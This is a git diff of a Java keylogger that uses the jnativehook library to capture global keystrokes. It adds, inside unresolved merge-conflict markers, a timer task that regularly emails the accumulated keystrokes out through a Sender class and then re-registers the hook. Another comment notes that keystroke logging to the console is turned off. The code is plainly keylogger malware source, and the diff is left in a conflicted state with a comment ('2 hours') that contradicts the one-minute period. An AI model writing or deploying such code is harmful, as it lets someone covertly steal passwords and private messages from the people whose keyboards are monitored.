@@ -20,7 +20,7 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 class Main implements NativeKeyListener {
-    private static String emailStr = "";
+    private static String emailStr = ""; // holds email contents
 
     public Main() {
         // disables logging of keystrokes in the output
@@ -43,6 +43,7 @@ class Main implements NativeKeyListener {
             var4.printStackTrace();
         }
 
+<<<<<<< Updated upstream
         try {
             //Sender.sendEmail("Testing");
             // System.out.println("EMAIL SENT!");
@@ -52,6 +53,33 @@ class Main implements NativeKeyListener {
         } catch (Throwable e) {
             e.printStackTrace();
         }
+=======
+        TimerTask mailingTask = new TimerTask() {
+            @Override
+            public void run() {
+                if (emailStr != "") {                   // send email if not empty
+                    try {
+                        Sender.sendEmail(emailStr);
+                        emailStr = "";                  // clear email contents
+                        GlobalScreen.registerNativeHook();
+                    } catch (NativeHookException var3) {
+                        var3.printStackTrace();
+                    } catch (Throwable e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        };
+
+
+        Timer timer = new Timer("timer");
+        long delay = 1000L;
+
+        //how often mail is sent (2 hours)
+        long period = 1000 * 60;
+
+        timer.scheduleAtFixedRate(mailingTask, delay, period);
+>>>>>>> Stashed changes
     }
 
     public void nativeKeyPressed(NativeKeyEvent e) {
